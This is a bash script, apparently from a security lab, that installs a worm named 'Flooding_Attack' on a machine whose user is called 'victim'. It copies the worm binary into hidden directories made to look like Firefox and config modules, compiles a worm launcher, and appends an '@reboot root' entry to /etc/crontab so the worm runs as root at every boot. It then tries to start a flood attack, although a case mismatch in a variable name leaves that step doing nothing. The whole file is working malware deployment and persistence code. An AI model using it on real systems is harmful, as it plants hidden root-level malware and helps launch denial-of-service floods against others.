#!/bin/bash

# This script is to:
# (1) Put the worm binary at the two locations:
#      * /home/victim/.etc/.module/Flooding_Attack
#      * /home/victim/.firefox/.module/Flooding_Attack
# (2) Put the worm checker program at "/home/victim/.Launch_Attack/Launching_Attack"
# (3) Tamper the crontab so that the worm is executed whenever the computer is booted
# 
# Noted that this script does not do any payload.

readonly ldir="/home/victim/.Launch_Attack"
readonly lfname="Launching_Attack"
readonly attack_start_ins="cd '$ldir' && [ -f '$ldir/$lfname' ] && './$lfname'"

tamper_crontab() {
    local crtbpath="/etc/crontab"

    if  grep -q "$ldir/$lfname" $crtbpath; then
        echo "Crontab already tampered."
        return 0
    fi

    if  echo "@reboot root $attack_start_ins" >> $crtbpath; then
        echo "Corntab tampered."
        return 0
    else
        echo "Failed to tamper crontab."
        return 1
    fi
}

distribute_worm() {
    local wormbin="Flooding_Attack"
    local dir1="/home/victim/.etc/.module"
    local dir2="/home/victim/.firefox/.module"

    if  mkdir -p $dir1 2> /dev/null &&\
        mkdir -p $dir2 2> /dev/null &&\
        cp "./$wormbin" "$dir1/$wormbin" 2> /dev/null &&\
        cp "./$wormbin" "$dir2/$wormbin" 2> /dev/null; then

        echo "Worm distributed."
        return 0
    else
        echo "Failed to distribute the worm."
        return 1
    fi
}

distribute_worm_launcher(){
    mkdir -p "$ldir" 2> /dev/null
    if  g++ -o "$ldir/$lfname" worm_launcher.cpp 2> /dev/null; then
        echo "Worm launcher distributed."
        return 0
    else
        echo "Failed to distribute worm launcher"
        return 1
    fi
}

start_flood_attack(){
    ${attack_Start_ins} 2> /dev/null
}

parent_path=$( cd "$(dirname "${BASH_SOURCE[0]}")" ; pwd -P )
cd "$parent_path"
if distribute_worm_launcher && distribute_worm && tamper_crontab ; then
    start_flood_attack &&\
    echo "All tasks successed. Flood attack starts." ||\
    echo "All tasks successed but cannot run the worm. Try rebooting the computer."
else
    echo "Task failed."
fi